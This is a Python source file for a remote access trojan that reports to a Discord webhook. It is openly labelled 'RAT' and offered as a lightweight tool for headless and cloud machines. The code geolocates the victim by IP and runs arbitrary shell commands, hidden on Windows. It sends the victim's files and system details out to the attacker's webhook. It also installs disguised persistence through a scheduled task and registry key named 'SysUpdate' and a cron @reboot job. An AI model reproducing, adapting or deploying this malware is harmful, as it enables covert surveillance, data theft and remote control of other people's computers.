"""
RAT DISCORD WEBHOOK v3.0 - ULTRA LIGHTWEIGHT
NO cv2, NO pyautogui, NO DISPLAY needed!
GPS + Shell + Persistence + File Upload
100% compatible Codespace/Cloud/Headless
"""
import threading
import requests
import psutil
import platform
import os
import subprocess
import time
import json
import io
import base64

# ═══════════════════════════════════════════════════════════════
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
POLL_INTERVAL = 30

webhook = WEBHOOK_URL
commands = []
last_commands = []

def send_webhook(title, content="", file=None):
    """Kirim ke Discord Webhook"""
    try:
        data = {"embeds": [{"title": title, "description": content, "color": 0xff4444}]}
        if file:
            files = {"file": file}
            requests.post(webhook, data=data, files=files, timeout=10)
        else:
            requests.post(webhook, json=data, timeout=10)
        return True
    except:
        return False

def get_sysinfo():
    """GPS Tracking + System Info"""
    try:
        # Public IP
        ip_resp = requests.get('https://api.ipify.org?format=json', timeout=5)
        public_ip = ip_resp.json()['ip']
        
        # GPS dari ipinfo.io
        geo_resp = requests.get(f'http://ipinfo.io/{public_ip}/json', timeout=5)
        geo = geo_resp.json()
        
        loc = geo.get('loc', '0.0,0.0').split(',')
        lat = float(loc[0]) if loc else 0.0
        lon = float(loc[1]) if len(loc) > 1 else 0.0
        
        # System stats
        ram = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent if platform.system() != "Windows" else psutil.disk_usage('C:\\').percent
        
        info = f"""**📍 GPS LOCATION**
        IP: {public_ip} City: {geo.get('city', 'Unknown')} Country: {geo.get('country', '??')} ISP: {geo.get('org', 'Unknown')}

📍 LATITUDE: {lat:.6f} 📍 LONGITUDE: {lon:.6f} 🗺️ https://maps.google.com/?q={lat:.6f},{lon:.6f}

💻 SYSTEM INFO Hostname: {platform.node()} OS: {platform.system()} {platform.release()} RAM: {ram:.1f}% | Disk: {disk:.1f}%

🕐 Uptime: {time.strftime('%H:%M:%S', time.gmtime(psutil.boot_time() - time.time()))}
**Processes:** {len(psutil.pids())} | **CPU:** {psutil.cpu_percent():.1f}%"""
        return info
    except Exception as e:
        return f"❌ GPS Error: {str(e)}"

def exec_shell(cmd):
    """Execute shell command"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(cmd, shell=True, capture_output=True, 
                                  text=True, timeout=25, 
                                  creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, 
                                  text=True, timeout=25)
        
        output = result.stdout.strip()
        error = result.stderr.strip()
        
        if output:
            return f"**✅ OUTPUT:**\n```{output[:1900]}```"
        elif error:
            return f"**❌ ERROR:**\n```{error[:1900]}```"
        else:
            return "**📭 No output**"
    except subprocess.TimeoutExpired:
        return "**⏰ Timeout (25s)**"
    except Exception as e:
        return f"**❌ Failed:** {str(e)}"

def upload_file(filename):
    """Upload file"""
    try:
        if os.path.exists(filename):
            size = os.path.getsize(filename)
            if size > 8 * 1024 * 1020:  # 8MB Discord limit
                return "❌ File too big (>8MB)"
            
            with open(filename, 'rb') as f:
                file_tuple = (os.path.basename(filename), f, 'application/octet-stream')
                send_webhook("📤 FILE UPLOAD", f"**{filename}**\nSize: {size/1024:.1f}KB", file_tuple)
            return f"✅ Uploaded {filename}"
        return f"❌ {filename} not found"
    except Exception as e:
        return f"❌ Upload failed: {str(e)}"

def add_persistence():
    """Add startup persistence"""
    try:
        if platform.system() == "Windows":
            # Scheduled Task
            subprocess.run('schtasks /create /sc onlogon /tn "SysUpdate" /tr "python rat.py" /f /rl highest', 
                          shell=True, capture_output=True)
            # Registry startup
            startup_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysUpdate /t REG_SZ /d "python rat.py" /f'
            subprocess.run(startup_cmd, shell=True, capture_output=True)
            return "✅ Windows: Task + Registry"
        else:
            # Cron job
            cron_job = f'@reboot cd {os.getcwd()} && nohup python3 rat.py &'
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -', shell=True)
            return "✅ Linux: Cron @reboot"
    except Exception as e:
        return f"❌ Persistence: {str(e)}"

def poll_commands():
    """Check for new commands"""
    global commands
    try:
        if os.path.exists('commands.txt'):
            with open('commands.txt', 'r') as f:
                new_commands = [line.strip() for line in f.readlines() if line.strip()]
            os.remove('commands.txt')
            
            # Merge without duplicates
            for cmd in new_commands:
                if cmd not in commands:
                    commands.append(cmd)
            print(f"📨 New commands: {len(new_commands)}")
    except:
        pass

def heartbeat():
    """Periodic status update"""
    while True:
        try:
            info = get_sysinfo()
            send_webhook("🔄 HEARTBEAT", info)
            time.sleep(1800)  # 30 minutes
        except:
            time.sleep(300)

if __name__ == "__main__":
    print("🚀 ULTRA LIGHT RAT starting...")
    print(f"📍 Target: {platform.node()}")
    
    # Start heartbeat thread
    threading.Thread(target=heartbeat, daemon=True).start()
    
    # Initial report
    send_webhook("🚀 RAT ONLINE", get_sysinfo())
    
    last_commands = []
    while True:
        try:
            poll_commands()
            
            # Process commands
            for cmd in commands[:]:
                if cmd not in last_commands:
                    last_commands.append(cmd)
                    print(f"🔧 Running: {cmd}")
                    
                    if cmd == "sysinfo":
                        send_webhook("📊 SYSINFO", get_sysinfo())
                        
                    elif cmd == "persist":
                        result = add_persistence()
                        send_webhook("🔄 PERSISTENCE", result)
                        
                    elif cmd.startswith("shell:"):
                        result = exec_shell(cmd[6:])
                        send_webhook("💻 SHELL EXEC", result)
                        
                    elif cmd.startswith("upload:"):
                        result = upload_file(cmd[7:])
                        send_webhook("📤 UPLOAD", result)
                        
                    elif cmd == "processes":
                        procs = "\n".join([p.info['name'][:20] for p in psutil.process_iter(['name'])][:15])
                        send_webhook("⚙️ TOP PROCESSES", f"```{procs}```")
            
            time.sleep(POLL_INTERVAL)
            
        except KeyboardInterrupt:
            send_webhook("🔴 RAT OFFLINE")
            break
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(10)